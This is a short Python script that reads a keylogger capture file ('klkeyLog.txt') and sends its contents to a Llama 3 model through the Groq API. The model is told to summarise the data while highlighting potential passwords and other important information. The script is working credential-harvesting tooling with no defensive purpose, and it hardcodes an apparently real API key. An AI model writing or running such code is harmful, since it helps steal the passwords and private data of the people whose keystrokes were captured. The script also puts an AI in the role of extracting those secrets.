from groq import Groq
client = Groq(
    # This is the default and can be omitted
    api_key="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",
)





with open('klkeyLog.txt', 'r') as file:
     content = file.read()
print(content)
system_prompt = {
    "role": "system",
    "content":content +
    "Summarize the data properly highlighting the potential passwords and other import informations"
}
# Initialize the chat history
chat_history = [system_prompt]

  # Append the user input to the chat history

response = client.chat.completions.create(model="llama3-8b-8192",
                                          messages=chat_history,
                                            max_tokens=100,
                                            temperature=1.2)
  # Append the response to the chat history
  # Print the response
print("Assistant:", response.choices[0].message.content)